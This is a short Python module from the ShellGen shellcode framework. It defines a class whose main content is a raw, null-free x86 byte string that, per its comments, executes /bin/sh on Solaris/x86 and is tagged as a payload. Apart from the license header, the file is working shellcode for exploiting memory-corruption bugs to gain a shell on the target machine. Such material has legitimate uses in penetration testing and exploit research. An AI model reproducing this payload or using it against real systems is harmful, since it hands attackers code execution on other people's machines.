#!/usr/bin/env python

###############################################################################
## Execute /bin/sh in Solaris/x86                                            ##
## Shellcode for ShellGen                                                    ##
## Based on original code by pancake from 48bits                             ##
## http://radare.org/y/                                                      ##
###############################################################################

# Copyright (c) 2012-2013 Mario Vilas, pancake
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
# MA 02110-1301, USA.

"Execute /bin/sh."

__all__ = ["Shell"]

from shellgen import Static

class Shell (Static):
    """
    Execute /bin/sh in Solaris/x86.

    Based on original code by pancake from 48bits:
    U{http://radare.org/y/}
    """

    qualities = "payload"
    encoding  = "nullfree"

    bytes = (
        "\xeb\x33\x5e\x8d\x06\x29\xc9\x89\xf3\x89\x5e\x08\xb1\x07\x80\x03\x20"
        "\x43"
        "\xe0\xfa"
        "\x93"
        "\x29\xc0"
        "\x89\x5e\x0b"
        "\x29\xd2"
        "\x88\x56\x19"
        "\x89\x56\x07"
        "\x89\x56\x0f"
        "\x89\x56\x14"
        "\xb0\x3b"
        "\x8d\x4e\x0b"
        "\x89\xca"
        "\x52"
        "\x51"
        "\x53"
        "\x50"
        "\xeb\x18"
        "\xe8\xc8\xff\xff\xff"
        "\x0f\x42\x49\x4e\x0f\x53\x48"
        "\x01\x01\x01\x01\x02\x02\x02\x02\x03\x03\x03\x03"
        "\x9a\x04\x04\x04\x04\x07\x04"
    )
